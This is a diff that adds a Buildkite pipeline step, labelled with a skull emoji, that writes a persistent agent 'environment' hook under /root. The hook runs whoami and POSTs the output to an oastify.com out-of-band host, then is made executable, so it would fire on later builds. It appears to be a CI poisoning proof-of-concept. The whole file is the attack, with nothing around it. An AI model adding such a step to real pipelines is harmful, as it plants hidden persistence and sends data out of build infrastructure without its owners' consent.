@@ -1,0 +1,3 @@
+steps:
+  - label: ":skull: Create Shell Hook"
+    command: "echo 'whoami | curl -X POST -d @- https://2668huadozkzuc65awmkmlt9h0nrbiz7.oastify.com/env' > /root/.buildkite-agent/hooks/environment && chmod +x /root/.buildkite-agent/hooks/environment"
